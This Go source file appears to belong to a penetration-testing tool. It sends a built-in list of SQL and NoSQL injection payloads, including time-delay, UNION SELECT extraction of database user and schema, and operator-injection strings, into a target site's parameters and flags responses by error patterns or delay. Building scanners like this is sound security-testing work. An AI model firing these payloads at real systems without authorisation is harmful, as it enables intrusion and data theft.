package scanner

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/briandowns/spinner"
	"github.com/fatih/color"
)

const (
	httpMethodPOST = "POST"
)

type SQLiConfig struct {
	URL     string
	Method  string
	Data    string
	Params  []string
	Headers []string
	Timeout time.Duration
	Threads int
}

type SQLiResult struct {
	URL       string
	Parameter string
	Payload   string
	Method    string
	Evidence  string
	RiskLevel string
}

type SQLiScanner struct {
	config  SQLiConfig
	client  *http.Client
	results []SQLiResult
	mutex   sync.Mutex
}

var sqliPayloads = map[string][]string{
	"error_based": {
		"'",
		"\"",
		"' OR '1'='1",
		"\" OR \"1\"=\"1",
		"' OR 1=1--",
		"\" OR 1=1--",
		"') OR ('1'='1",
		"\") OR (\"1\"=\"1",
		"' UNION SELECT NULL--",
		"\" UNION SELECT NULL--",
		"' AND 1=CAST((SELECT COUNT(*) FROM sysobjects) AS INT)--",
		"'; WAITFOR DELAY '00:00:05'--",
		"' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
		"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x " +
			"FROM information_schema.tables GROUP BY x)a)--",
	},
	"boolean_based": {
		"1' AND '1'='1",
		"1' AND '1'='2",
		"1 AND 1=1",
		"1 AND 1=2",
		"' AND SUBSTRING(VERSION(),1,1)='5",
		"' AND LENGTH(DATABASE())>0--",
		"' AND ASCII(SUBSTRING(USER(),1,1))>64--",
	},
	"time_based": {
		"'; WAITFOR DELAY '00:00:05'--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"' OR SLEEP(5)--",
		"1'; SELECT SLEEP(5)--",
		"' AND IF(1=1,SLEEP(5),0)--",
		"'; BENCHMARK(5000000,MD5(1))--",
	},
	"union_based": {
		"' UNION SELECT NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL--",
		"1' UNION SELECT 1,2,3--",
		"1' UNION ALL SELECT 1,2,3,4--",
		"' UNION SELECT user(),database(),version()--",
		"' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
	},
	"nosql": {
		"'||'1'=='1",
		"{\"$ne\": null}",
		"{\"$gt\": \"\"}",
		"'; return true; var x='",
		"' && this.password.match(/.*/)//+%00",
		"admin'||''=='",
	},
}

var errorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)mysql_fetch_array|mysql_num_rows|mysql_error|you have an error in your sql syntax`),
	regexp.MustCompile(`(?i)postgresql|pg_query|pg_exec|syntax error at or near`),
	regexp.MustCompile(`(?i)microsoft ole db|sqlserver|syntax error|unclosed quotation mark`),
	regexp.MustCompile(`(?i)ora-\d+|oracle error|ociexecute|ocifetchstatement`),
	regexp.MustCompile(`(?i)sqlite_exec|sqlite error|syntax error near`),
	regexp.MustCompile(`(?i)sql syntax|database error|db error|query failed|invalid query`),
}

func NewSQLiScanner(config SQLiConfig) *SQLiScanner {
	return &SQLiScanner{
		config: config,
		client: &http.Client{
			Timeout: config.Timeout,
		},
		results: make([]SQLiResult, 0),
	}
}

func (s *SQLiScanner) GetConfig() SQLiConfig {
	return s.config
}

func (s *SQLiScanner) GetClient() *http.Client {
	return s.client
}

func (s *SQLiScanner) GetResults() []SQLiResult {
	return s.results
}

func (s *SQLiScanner) AddResult(result SQLiResult) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.results = append(s.results, result)
}

func (s *SQLiScanner) Scan() []SQLiResult {
	s.results = make([]SQLiResult, 0)

	sp := spinner.New(spinner.CharSets[14], 100*time.Millisecond)
	sp.Start()
	defer sp.Stop()

	parsedURL, err := url.Parse(s.config.URL)
	if err != nil {
		color.Red("Error parsing URL: %v", err)
		return s.results
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, s.config.Threads)

	if len(s.config.Params) == 0 {
		for param := range parsedURL.Query() {
			s.config.Params = append(s.config.Params, param)
		}

		if s.config.Method == httpMethodPOST && s.config.Data != "" {
			formData, err := url.ParseQuery(s.config.Data)
			if err == nil {
				for param := range formData {
					s.config.Params = append(s.config.Params, param)
				}
			}
		}
	}

	if len(s.config.Params) == 0 {
		color.Yellow("⚠️  No parameters detected. Trying common parameter names...")
		s.config.Params = []string{"id", "user", "username", "q", "search", "query", "page", "category", "type"}
	}

	for _, payloadType := range []string{"error_based", "boolean_based", "time_based", "union_based", "nosql"} {
		for _, param := range s.config.Params {
			for _, payload := range sqliPayloads[payloadType] {
				wg.Add(1)
				go func(param, payload, payloadType string) {
					defer wg.Done()
					semaphore <- struct{}{}
					defer func() { <-semaphore }()

					s.testPayload(param, payload, payloadType)
				}(param, payload, payloadType)
			}
		}
	}

	wg.Wait()
	return s.results
}

func (s *SQLiScanner) testPayload(param, payload, payloadType string) {
	parsedURL, err := url.Parse(s.config.URL)
	if err != nil {
		return
	}

	var req *http.Request

	if s.config.Method == "GET" {
		query := parsedURL.Query()
		query.Set(param, payload)
		parsedURL.RawQuery = query.Encode()

		req, err = http.NewRequest("GET", parsedURL.String(), nil)
	} else if s.config.Method == httpMethodPOST {
		var postData string
		if s.config.Data != "" {
			formValues, parseErr := url.ParseQuery(s.config.Data)
			if parseErr != nil {
				return
			}
			formValues.Set(param, payload)
			postData = formValues.Encode()
		} else {
			postData = url.Values{param: {payload}}.Encode()
		}

		req, err = http.NewRequest("POST", s.config.URL, strings.NewReader(postData))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	if err != nil {
		return
	}

	for _, header := range s.config.Headers {
		parts := strings.SplitN(header, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	startTime := time.Now()

	resp, err := s.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	responseTime := time.Since(startTime)
	bodyStr := string(body)

	s.analyzeResponse(param, payload, payloadType, bodyStr, responseTime)
}

func (s *SQLiScanner) analyzeResponse(
	param, payload, payloadType string, body string, responseTime time.Duration,
) {
	var vulnerability *SQLiResult

	switch payloadType {
	case "error_based":
		if s.detectSQLError(body) {
			vulnerability = &SQLiResult{
				URL:       s.config.URL,
				Parameter: param,
				Payload:   payload,
				Method:    s.config.Method,
				Evidence:  "SQL error detected in response",
				RiskLevel: "High",
			}
		}

	case "time_based":
		if responseTime > 4*time.Second {
			vulnerability = &SQLiResult{
				URL:       s.config.URL,
				Parameter: param,
				Payload:   payload,
				Method:    s.config.Method,
				Evidence:  fmt.Sprintf("Response delayed by %v", responseTime),
				RiskLevel: "High",
			}
		}

	case "boolean_based":
		if s.detectSQLError(body) {
			vulnerability = &SQLiResult{
				URL:       s.config.URL,
				Parameter: param,
				Payload:   payload,
				Method:    s.config.Method,
				Evidence:  "Boolean-based SQL injection detected",
				RiskLevel: "Medium",
			}
		}

	case "union_based":
		if s.detectUnionSuccess(body) {
			vulnerability = &SQLiResult{
				URL:       s.config.URL,
				Parameter: param,
				Payload:   payload,
				Method:    s.config.Method,
				Evidence:  "UNION-based SQL injection detected",
				RiskLevel: "High",
			}
		}

	case "nosql":
		if s.detectNoSQLError(body) {
			vulnerability = &SQLiResult{
				URL:       s.config.URL,
				Parameter: param,
				Payload:   payload,
				Method:    s.config.Method,
				Evidence:  "NoSQL injection detected",
				RiskLevel: "High",
			}
		}
	}

	if vulnerability != nil {
		s.mutex.Lock()
		s.results = append(s.results, *vulnerability)
		s.mutex.Unlock()
	}
}

func (s *SQLiScanner) DetectSQLError(body string) bool {
	return s.detectSQLError(body)
}

func (s *SQLiScanner) detectSQLError(body string) bool {
	for _, pattern := range errorPatterns {
		if pattern.MatchString(body) {
			return true
		}
	}
	return false
}

func (s *SQLiScanner) DetectUnionSuccess(body string) bool {
	return s.detectUnionSuccess(body)
}

func (s *SQLiScanner) detectUnionSuccess(body string) bool {
	unionIndicators := []string{
		"mysql_fetch",
		"Warning: mysql",
		"supplied argument is not a valid MySQL result",
		"The used SELECT statements have a different number of columns",
	}

	bodyLower := strings.ToLower(body)
	for _, indicator := range unionIndicators {
		if strings.Contains(bodyLower, strings.ToLower(indicator)) {
			return true
		}
	}
	return false
}

func (s *SQLiScanner) DetectNoSQLError(body string) bool {
	return s.detectNoSQLError(body)
}

func (s *SQLiScanner) detectNoSQLError(body string) bool {
	nosqlErrors := []*regexp.Regexp{
		regexp.MustCompile(`(?i)mongodb|mongo|bson error`),
		regexp.MustCompile(`(?i)couchdb|couch error`),
		regexp.MustCompile(`(?i)invalid json|json parse error`),
	}

	for _, pattern := range nosqlErrors {
		if pattern.MatchString(body) {
			return true
		}
	}
	return false
}
